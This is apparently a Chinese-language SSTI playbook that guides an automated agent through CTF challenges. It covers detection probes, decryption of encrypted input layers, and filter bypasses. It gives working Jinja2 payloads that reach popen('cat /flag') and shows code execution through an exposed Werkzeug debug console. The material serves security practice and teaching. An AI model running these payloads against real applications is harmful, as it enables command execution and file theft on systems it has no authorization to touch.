# 服务端模板注入 (SSTI)

## 描述
通过用户输入控制模板引擎的渲染，执行任意代码或读取敏感数据。

## 触发条件
- 使用模板引擎（如 Jinja2、Twig、ERB、Mako、Freemarker）渲染用户输入。
- 页面返回的内容与用户输入存在交互（如 `Hello, {{ username }}`）。

## 检测方法
1. **数学表达式测试**：`{{ 7*7 }}` → 若返回 `49`，则存在SSTI。
2. **字符测试**：`{{ 7*'7' }}` → 若返回 `7777777`，则可能是 Jinja2（字符串乘法）。
3. **`config` 测试**：`{{ config }}` → 若返回配置信息，则表明是Flask/Jinja2。

## 标准分析流程（必须按顺序执行）

### 第1步：路由探测（避免漏判入口）
**禁止只在一个路由尝试注入！** 使用 `ssti_route_probe` 工具自动遍历常见路径和参数：
- 工具会测试 `/`, `/index`, `/search`, `/render`, `/template`, `/secret`, `/flag` 等路径
- 测试 `name`, `input`, `query`, `secret`, `cmd` 等参数名
- 用 `{{7*7}}` 标记，检测响应中是否出现 `49` 且原payload消失（说明被渲染）
- 命中后再针对性深入利用

### 第2步：加密层识别（若接口返回看似乱码）
若提交 `{{7*7}}` 后响应不是 `49` 而是一串十六进制/base64，说明接口对输入做了加密：
1. **收集样本**：提交几个已知明文（如 `a`, `b`, `aa`, `aaa`），记录对应密文
2. **调用 `crypto_detect`**：传入 `[{"plaintext":"a","ciphertext":"..."},{"plaintext":"b","ciphertext":"..."}]`
3. **根据返回结果选择工具**：
   - `xor_single_byte` → 用 `xor_crypt` (key=0xNN)
   - `xor_multi_byte` → 用 `xor_crypt` (key=字符串)
   - `rc4_likely` → 需要从源码/配置提取RC4密钥，再用 `rc4_crypt`
   - `aes_likely` → 用 `execute_python` 调用 pycryptodome

### 第3步：过滤分析（绕过 safe() 等黑名单）
若源码中有 `safe()` / `preg_match()` 过滤 `<>;|` 等字符：
- **加密后注入**（推荐）：用 `generate_ssti_encrypted_payload` 加密payload，加密后字节经URL编码不含原始禁止字符
- **替代语法**：`{%...%}`、`#...#`（视引擎而定）
- **attr过滤器**：`{{ ''|attr('__class__') }}` 绕过 `.` 过滤
- **request对象**：`{{ ''[request.headers.x] }}`，在请求头中传 `__class__`

### 第4步：深入利用
找到SSTI入口后：
1. `{{ config }}` 识别框架（Flask/Jinja2）
2. 读取文件 / 执行命令（见下方Payload）

## 利用方式

### 读取文件（Jinja2）
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 找到 <class 'os._wrap_close'> 索引，调用其 __init__.__globals__['popen']('cat /flag').read()
```

### 执行系统命令
```python
{{ config.items() | attr('__class__') ... }}
# 利用内置函数，构建可执行命令链
```

### 绕过 _ 和 [] 过滤
```
使用 request 对象：{{ ''[request.headers.x] }}，在请求头中设置 x: __class__
使用 |attr() 过滤器：{{ ''|attr('__class__') }}
```

### 常用Payload（Jinja2）
```python
# 获取基类
{{ ''.__class__.__mro__[1] }}
# 获取子类列表
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 查找 os._wrap_close
{{ ''.__class__.__mro__[1].__subclasses__()[?] }}
# 执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[?].__init__.__globals__['popen']('cat /flag').read() }}
```

## 加密SSTI场景（重要）

### 场景特征
- 接口对用户输入做加密（RC4/XOR）后再渲染或返回
- 直接提交 `{{7*7}}` 无效，返回的是密文
- 源码中可见 `rc4.do_crypt()` / `xor()` 等加密函数

### 解决方案
1. **识别算法**：`crypto_detect` 传入2组以上明密文对
2. **提取密钥**：从源码 `key = "xxx"` 提取
3. **生成加密payload**：
   ```
   generate_ssti_encrypted_payload(
     payload="{{config}}",
     algorithm="rc4",
     key="secret_key",
     output_format="url"
   )
   ```
4. **提交加密payload**：将返回的encrypted值作为参数提交
5. **若响应仍是密文**：用 `rc4_crypt` / `xor_crypt` 解密响应查看结果

### XOR 0x55 单字节场景
```
xor_crypt(data="{{7*7}}", key="0x55", output_format="url")
```

## Werkzeug 调试器利用（Flask debug模式）

### 场景特征
- Flask 应用 `app.run(debug=True)`
- 访问 `/console` 出现 Werkzeug 调试器控制台
- 源码中可能有 `SECRET = "..."` 或 `app.secret_key = "..."`

### 利用流程
1. **探测调试器**：`werkzeug_debugger_probe(base_url)` 检测是否开启及所需认证方式
2. **提取SECRET**：从源码中提取 `SECRET` 变量（注意：这是调试器SECRET，非Flask SECRET_KEY）
3. **执行代码**：
   ```
   werkzeug_debugger_exec(
     base_url="http://target:5000",
     code="print(open('/flag').read())",
     secret="9eP1BBj0yK4q3PhbJHWv"
   )
   ```

### PIN 认证（Werkzeug >= 2.1）
若探测结果显示需要PIN：
- PIN基于机器信息自动生成
- 可能从 `/console` 页面、错误页泄露、环境变量获取
- 提取后传入 `pin` 参数：
  ```
  werkzeug_debugger_exec(base_url=..., code=..., secret=..., pin="123-456-789")
  ```

### s 参数计算原理
Werkzeug调试器执行代码时校验 `s` 参数：
```
s = sha1(cmd + secret).hexdigest()
```
工具内部自动计算，只需提供正确的 `secret`。

## 绕过技巧汇总

- 过滤 `{{` 或 `}}`：尝试 `{%` 或 `{!!`（视引擎而定）
- 过滤 `.`：使用 `[]` 或 `|attr()`
- 过滤关键字：使用 `request` 或字符串拼接
- 过滤 `<>;|` 等字符：**加密后注入**（见上方加密SSTI场景）
- 过滤 `_`：用 `\x5f` 或 `|attr('\x5f\x5fclass\x5f\x5f')`

## 附加提示

- 不同模板引擎的语法不同，需先识别引擎
- 若存在沙箱，需寻找可用的 `__builtins__` 或 `os` 模块
- **遇到加密接口优先用 `crypto_detect` 自动识别，不要手工猜测**
- **发现 Flask debug 模式优先用 `werkzeug_debugger_probe` + `werkzeug_debugger_exec`，比SSTI更直接**
